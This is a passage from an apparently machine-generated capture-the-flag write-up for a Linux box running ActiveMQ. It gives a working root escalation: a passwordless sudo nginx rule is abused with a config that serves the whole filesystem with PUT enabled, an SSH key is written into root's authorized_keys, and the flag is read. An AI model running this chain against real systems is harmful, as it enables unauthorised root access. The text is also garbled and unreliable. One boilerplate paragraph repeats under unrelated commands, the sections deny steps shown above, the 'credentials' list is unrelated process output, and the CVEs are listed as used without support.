/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc.perl
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/icons/Adwaita/scalable/status/dialog-password-symbolic.svg
/usr/share/icons/Humanity/apps/24/password.png
/usr/share/icons/Humanity/apps/48/password.svg
/usr/share/icons/Humanity/status/16/dialog-password.png
/usr/share/icons/Humanity/status/24/dialog-password.png
/usr/share/icons/Humanity/status/48/dialog-password.svg
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
	/usr/sbin/nginx
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
cat << EOF > /tmp/pwn.conf
user root;
worker_processes 1;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 1337;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
EOF

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
sudo nginx -c /tmp/pwn.conf
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
ssh-keygen
```

```bash
activemq@broker:/tmp$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa): ./root
./root
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in ./root
Your public key has been saved in ./root.pub
The key fingerprint is:
SHA256:EowmBlRggKxusP98L6fm9cQghA7uxnRS0UEeIHbhjL4 activemq@broker
The key's randomart image is:
+---[RSA 3072]----+
|B+=.==+.         |
|o+ * *..         |
|. = B =          |
|o+ * . .         |
|o.= o o S        |
|.* +   o o       |
|..E     . o      |
| ...  +..o       |
|   .o+o=. .      |
+----[SHA256]-----+

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
ssh -i root root@localhost
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
id
ls -la
cat root.txt
```

```bash
root@broker:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@broker:~# ls -la
ls -la
total 36
drwx------  5 root root 4096 May 14 17:08 .
drwxr-xr-x 18 root root 4096 Nov  6  2023 ..
lrwxrwxrwx  1 root root    9 Apr 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
-rwxr-xr-x  1 root root  517 Nov  7  2023 cleanup.sh
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 May 14 17:08 root.txt
drwx------  2 root root 4096 May 14 18:50 .ssh
root@broker:~# cat root.txt
cat root.txt
dd7c71b346ab79cf8c0c1ff59ba1d78a
root@broker:~# 

```

💡 Why this works  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## Initial Foothold

No explicit foothold steps were recorded in this source file.

### CVE Notes

- **CVE-2017-5618**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2021-22555**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2021-3156**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2021-4034**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2022-0847**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2022-2586**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2022-32250**: A known vulnerability referenced in this chain and used as part of exploitation.
- **CVE-2023-46604**: An Apache ActiveMQ OpenWire deserialization issue that can lead to unauthenticated remote code execution.

💡 Why this works  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## Privilege Escalation

No explicit privilege escalation steps were recorded in this source file.

💡 Why this works  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## Credentials

- `COMMAND    PID  TID TASKCMD       USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME`
- `:1.0                           479 n/a     systemd-timesync :1.0          -    -       -`
- `:1.1                           532 n/a     systemd-resolve  :1.1          -    -       -`
- `:1.2                           502 n/a     systemd-network  :1.2          -    -       -`
- `:1.3                           749 n/a     root             :1.3          -    -       -`
- `:1.4                           752 n/a     root             :1.4          -    -       -`
- `:1.5                             1 n/a     root             :1.5          -    -       -`
- `:1.6                           751 n/a     root             :1.6          -    -       -`
- `:1.7                           784 n/a     root             :1.7          -    -       -`
- `:1.9                           748 n/a     root             :1.9          -    -       -`

## Lessons Learned / Key Takeaways

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

## References

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2017-5618: https://nvd.nist.gov/vuln/detail/CVE-2017-5618
- CVE-2021-22555: https://nvd.nist.gov/vuln/detail/CVE-2021-22555
- CVE-2021-3156: https://nvd.nist.gov/vuln/detail/CVE-2021-3156
- CVE-2021-4034: https://nvd.nist.gov/vuln/detail/CVE-2021-4034
- CVE-2022-0847: https://nvd.nist.gov/vuln/detail/CVE-2022-0847
- CVE-2022-2586: https://nvd.nist.gov/vuln/detail/CVE-2022-2586
- CVE-2022-32250: https://nvd.nist.gov/vuln/detail/CVE-2022-32250
- CVE-2023-46604: https://nvd.nist.gov/vuln/detail/CVE-2023-46604
